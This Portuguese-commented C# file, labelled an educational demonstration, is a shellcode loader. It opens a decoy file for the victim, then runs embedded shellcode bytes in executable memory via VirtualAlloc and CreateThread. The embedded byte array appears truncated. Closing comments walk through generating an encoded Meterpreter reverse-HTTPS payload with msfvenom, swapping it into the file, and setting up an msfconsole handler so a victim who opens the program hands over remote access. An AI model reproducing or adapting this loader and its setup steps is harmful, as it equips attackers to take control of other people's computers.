/* 
 [ NOTA IMPORTANTE ]

Este código é apenas uma DEMONSTRAÇÃO de como um ataque de Shell reverso é realizado, o mesmo não possui todas as 
funcionalidades de um ataque real, portanto é possivel que sua maquina o bloqueie antes mesmo de compila-lo.

No entanto, é de suma importancia o entendimento de que este código é para fins EDUCATIVOS, portanto NÃO ME RESPONSABILIZO
por QUAISQUER usos INAPROPRIADOS do mesmo.
*/
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace ReverseHTTPS {
    internal class Program {
        // Importações da kernel32.dll
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
        // Constantes para alocação de memória e thread
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint INFINITE = 0xFFFFFFFF;
        static void Main(string[] args) {
            Console.WriteLine("NOTA: Esse codigo é APENAS PARA USO EDUCACIONAL EM AMBIENTE CONTROLADO, JAMAIS DEVERÁ SER UTILIZADO EM AMBIENTE REAL.");
            Console.ReadLine();
            try {
                string pastaArquivoAbertura = @"C:\index.html";
                ProcessStartInfo startInfo = new ProcessStartInfo
                { FileName = pastaArquivoAbertura, UseShellExecute = true };
                Process process = Process.Start(startInfo);
                Console.WriteLine("Aplicativo chamado com sucesso");

                // Executa o shellcode em uma nova tarefa
                Task.Run(() => ExecuteShellcode());
                process.WaitForExit();
                Console.WriteLine("Processo Finalizado");
            }
            catch (Exception ex) { Console.WriteLine("Erro ao chamar aplicativo: " + ex.Message); }
        }
        static void ExecuteShellcode() {
            // Shellcode armazenado como matriz de bytes
            byte[] buf = new byte[731] {0xfc,0xe8,0x8f,0x00,0x00,0x00,
                0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,0x89,0xe5,0x8b,0x52,0x0c, 0x8b,0x52,0x14,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x8b,0x72,0x28,
                0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d, 0x01,0xc7,0x49,0x75,0xef,0x52,0x8b,0x52,0x10,0x8b,0x42,0x3c,
                0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x57,0x74,0x4c,0x01,0xd0, 0x8b,0x58,0x20,0x8b,0x48,0x18,0x01,0xd3,0x50,0x85,0xc9,0x74,
                0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xc1, 0xcf,0x0d,0xac,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,
                0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66, 0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,
            };
            try {
                Console.WriteLine("Alocando memória...");
                IntPtr address = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                if (address == IntPtr.Zero) { Console.WriteLine("Falha ao alocar memória."); return; }
                Console.WriteLine("Copiando shellcode para memória alocada...");
                Marshal.Copy(buf, 0, address, buf.Length);
                Console.WriteLine("Criando thread para executar o shellcode...");
                uint threadId;
                IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, address, IntPtr.Zero, 0, out threadId);
                if (threadHandle == IntPtr.Zero) { Console.WriteLine("Falha ao criar thread."); return; }
                Console.WriteLine("Esperando execução do shellcode...");
                WaitForSingleObject(threadHandle, INFINITE);
                Console.WriteLine("Shellcode executado com sucesso.");
            }
            catch (Exception ex) { Console.WriteLine($"Erro ao executar shellcode: {ex.Message}"); }
        }
    }
}
// Como é feito o uso do malware
// no ExecuteShellcode(): abra a maquina virtual kali linux, digite no terminal: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -f csharp
// Em seguida copie o codigo e subistitua o payload atual pelo payload gerado
// Em seguida configure o msfconsole:
// 1 -> digite: msfconsole
// 2 -> digite: use exploit/multi/handler
// 3 -> digite: set payload windows/x64/meterpreter/reverse_https
// 4 -> digite: set LHOST [seu_ip]
// 5 -> digite: set LPORT 443
// 6 -> digite: exploit 
// O metasploit ira aguardar uma conexao, com isso quando a vitima abrir o reverseHTTPS a conexao sera estabelecida e o acesso sera consedido via msfconsole
